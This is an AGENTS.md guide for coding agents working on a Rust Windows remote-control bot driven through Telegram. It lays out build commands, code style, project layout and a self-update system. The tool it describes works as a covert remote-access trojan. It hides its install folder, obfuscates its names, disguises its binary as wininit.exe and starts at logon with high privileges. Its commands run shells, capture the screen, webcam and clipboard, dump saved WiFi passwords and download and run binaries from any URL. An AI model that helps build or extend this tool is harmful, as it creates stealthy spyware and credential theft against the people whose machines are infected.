# AGENTS.md — Coding Agents Guide for tg-remote-bot

## Project Overview

A Windows remote-control agent that runs via Task Scheduler and is controlled
via Telegram Bot API using long polling. One machine = one bot token. Super user
can send commands from any chat (DM, group).

- **Language:** Rust (edition 2024)
- **Target:** `x86_64-pc-windows-msvc` (Windows 10/11)
- **Runtime:** tokio (full features)
- **Bot framework:** teloxide 0.17 with macros
- **Logging:** fern + chrono — daily rotating file logs in `{home}/logs/`
- **Config:** DPAPI-encrypted registry (no .env, no baked token)
- **Error handling:** anyhow

## Build / Run / Test Commands

```powershell
# Build release
cargo build --release

# Build debug
cargo build

# Run in foreground (debug/test)
cargo run -- --run <TOKEN> <UID>

# Run as daemon (Task Scheduler mode)
cargo run -- --daemon

# Install via Task Scheduler (requires admin)
cargo run -- --install <TOKEN> <UID>

# Reinstall (update registry config)
cargo run -- --reinstall <TOKEN> <UID>

# Uninstall Task Scheduler task
cargo run -- --uninstall

# Lint
cargo clippy --all-targets -- -D warnings

# Format
cargo fmt --all

# Format check
cargo fmt --all -- --check

# Run all tests
cargo test

# Run single test
cargo test test_name_here

# Check types
cargo check
```

## Code Style Guidelines

### Imports
- Group: `std` → external crates → `crate::` modules, blank line between groups.
- Prefer `use` over fully qualified paths.
- No glob imports except in test modules.

### Naming
- Modules: `snake_case` (e.g., `rate_limit.rs`)
- Types: `PascalCase` (e.g., `AgentState`, `RunningJob`)
- Functions/vars: `snake_case` (e.g., `is_authorized`, `truncate_str`)
- Constants: `SCREAMING_SNAKE_CASE` (e.g., `MAX_MSG_BYTES`)
- Telegram commands: match command name (e.g., `fn screenshot()`, `fn sysinfo()`)

### Types & Patterns
- `anyhow::Result` for fallible functions.
- `Arc<Mutex<T>>` for shared mutable state (e.g., `ActiveJob`).
- `Mutex<HashMap<&str, Bucket>>` for rate limiting.
- Sensitive strings via `obfstr::obfstring!()` in `security/obfuscation.rs`.
- Config: CLI args or registry (DPAPI encrypted) — no .env or baked token.
- Uptime: stored as `Instant` in `AgentState.start_time`, computed via `start_time.elapsed()`.
- String truncation: use `bot::truncate_str()` which respects UTF-8 char boundaries.
- Truncate + escape combo: use `bot::truncate_and_escape(text, md::MAX_MSG_BYTES)`.

### MarkdownV2
- All messages use `ParseMode::MarkdownV2` via `md::send()`.
- All dynamic content MUST be escaped via `md::escape()`.
- Static content must have `.` `,` `(` `)` `!` `+` `-` escaped with `\`.
- Error replies: use `md::reply_error(bot, chat_id, reply_to, "Label", err)`.

### Formatting
- No `.rustfmt.toml` — use defaults (4-space indent, 100 char width).
- No comments unless explicitly asked.

### Error Handling
- Propagate with `?`; avoid `.unwrap()`.
- Use `.unwrap_or_else(|e| e.into_inner())` for mutex locks (handles poisoned mutex).
- Never panic in command handlers — return errors to user via Telegram.
- Use `anyhow::Context` for adding context: `.context("describing what failed")?`

### Async / Concurrency
- `tokio::spawn` for detached tasks; `JoinHandle` stored in `ActiveJob` for `/cancel`.
- Mutex lock must NOT be held across `.await` — extract value first, drop guard, then await.
- Shell output truncated at `md::MAX_MSG_BYTES` (3800) via `truncate_str()`.
- Read stdout/stderr concurrently via separate `tokio::spawn` tasks to avoid pipe deadlock.
- CPU/GPU-bound operations (screen capture, camera) must use `tokio::task::spawn_blocking`.

### Task Scheduler
- Task runs as current user (not SYSTEM) via `/ru <USERNAME>` with `/rl highest`.
- Trigger: `/sc onlogon` — runs when user logs in.
- Because process runs in user session, all desktop commands work directly (no delegation needed).

### Project Structure
```
src/
├── main.rs           # CLI args, mutex check, admin check, daemon mode
├── bot/
│   ├── mod.rs        # AgentState, run_until(cfg, ctrlc) with retry loop
│   │                 # truncate_str(), truncate_and_escape(), format_duration()
│   ├── auth.rs       # is_authorized()
│   ├── md.rs         # MarkdownV2 escape(), send(), send_photo(), send_document(),
│   │                 # reply_error(), MAX_MSG_BYTES constant
│   ├── router.rs     # Command enum, handler functions, ensure_authorized(),
│   │                 # check_rate_limit(), help_text()
│   └── rate_limit.rs # Token bucket per-command rate limiter
├── commands/
│   ├── ping.rs       # PONG + IP + uptime + version
│   ├── status.rs     # PID + uptime + job status
│   ├── screenshot.rs # Screen capture → JPEG (spawn_blocking)
│   ├── shell.rs      # cmd /C execution + /cancel (concurrent stdout/stderr read)
│   ├── sysinfo.rs    # CPU, RAM, disks, network (saturating_sub for disk calc)
│   ├── system.rs     # lock, shutdown, restart, abort, run (shared run_shutdown_cmd)
│   ├── files.rs      # listfiles, getfile (MAX_GETFILE_BYTES = 50MB)
│   ├── procs.rs      # procs, kill (let-else pattern, MAX_PROCS constant)
│   ├── network.rs    # netstat (interface list)
│   ├── clipboard.rs  # Read clipboard (truncate_and_escape)
│   ├── location.rs   # IP geolocation (HTTPS, formatted JSON response)
│   ├── camera.rs     # Webcam capture (spawn_blocking)
│   ├── wallpaper.rs  # Get desktop wallpaper (md::send_document)
│   ├── wifi.rs       # Saved WiFi profiles + passwords (parse_profile_name helper)
│   ├── audio.rs      # mute, unmute, volume (Core Audio API via PowerShell)
│   └── msgbox.rs     # MessageBox Win32 (blocking, spawn_blocking)
├── security/
│   ├── dpapi.rs      # CryptProtectData / CryptUnprotectData
│   └── obfuscation.rs # obfstr! for service name, registry path, install_home
├── service/
│   ├── config.rs     # Registry-only config (DPAPI encrypted)
│   ├── install.rs    # Task Scheduler install/uninstall + setup_home_dir() + cleanup_old_files()
│   ├── logging.rs    # DailyFile writer + init_logger()
│   └── scheduler.rs  # schtasks.exe wrappers (install/uninstall/stop)
└── updater/
    └── self_update.rs # resolve_update_url(), download, apply_update, auto_update
```

### Self-Update System
- **Auto-update:** On daemon start, fetches GitHub Releases API, compares `tag_name` with `CARGO_PKG_VERSION` (semver). If newer → downloads `wininit.exe` → swaps binary → exits. Task Scheduler restarts automatically.
- **Manual `/update <url>`:** Downloads binary from user-provided URL, swaps, exits.
- **`/update` (no args):** Uses `resolve_update_url()` to auto-check GitHub, downloads if available.
- **Flow:** `resolve_update_url()` → `find_asset_url()` → `download_file()` → `apply_update()`
- **Swap order:** rename exe to .old → copy new → `process::exit(0)`
- **Cleanup:** `.old` files deleted on next startup via `cleanup_old_files()` in `service::install`.
- **GitHub Release:** Binary must be named `wininit.exe` as release asset.
- **CI/CD:** `.github/workflows/release.yml` — triggers on `v*` tag push, builds, creates release with `wininit.exe`.

### Win32 API Notes
- `LockWorkStation` is in `windows_sys::Win32::System::Shutdown` (not `UI::WindowsAndMessaging`).
- `DuplicateTokenEx` is in `windows_sys::Win32::Security` (not `System::Threading`).
- `CreatePipe` parameter `sa` does not need `mut`.

### Mandatory Rules
1. Only one instance per machine — enforced via named mutex (`CreateMutexA`).
2. `--install` requires admin — checked via HKLM write access.
3. Polling retry with exponential backoff on `TerminatedByOtherGetUpdates`.
4. All commands reply to the specific message via `reply_parameters`.
5. `AgentState` includes `agent_version = env!("CARGO_PKG_VERSION")` and `start_time: Instant`.
6. No topic/group constraints — super user can command from anywhere.
7. Install creates hidden home dir in `%ProgramData%`, copies exe, then registers Task Scheduler task.
8. Log files in `{home}/logs/agent_YYYY-MM-DD.log`, daily rotation via `DailyFile` writer.
9. Config via CLI args (`--run TOKEN UID`, `--install TOKEN UID`) — no .env, no baked token.
10. `run_until()` takes `AppConfig` and `enable_ctrlc` as parameters; daemon mode loads from registry.
11. Auth check uses `ensure_authorized()` helper in `router.rs` — do not duplicate auth logic.
12. All commands that could be abused have rate limits in `rate_limit.rs`.
